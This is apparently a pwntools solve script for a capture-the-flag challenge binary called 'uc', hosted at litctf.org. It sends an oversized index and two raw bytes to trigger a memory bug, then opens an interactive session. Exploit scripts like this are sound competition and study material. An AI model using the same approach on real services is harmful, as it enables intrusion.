#!/usr/bin/env python3

from pwn import *

elf = ELF("./uc")
context.binary = elf
context.terminal = ['kitty','-e']

gdbscript = '''
starti
b*panic
'''

if args.REMOTE:
	p = remote('litctf.org',31779)
elif args.GDB:
	p = gdb.debug(elf.path, gdbscript=gdbscript)
else:
	p = process(elf.path)

p.recvuntil(b'Where are you beginning your leet?')
p.sendline(b'99999999999999999999999999999999')
p.recvuntil(b'What do you want to leet?')
p.sendline(b'\x00\x7f')
p.interactive()

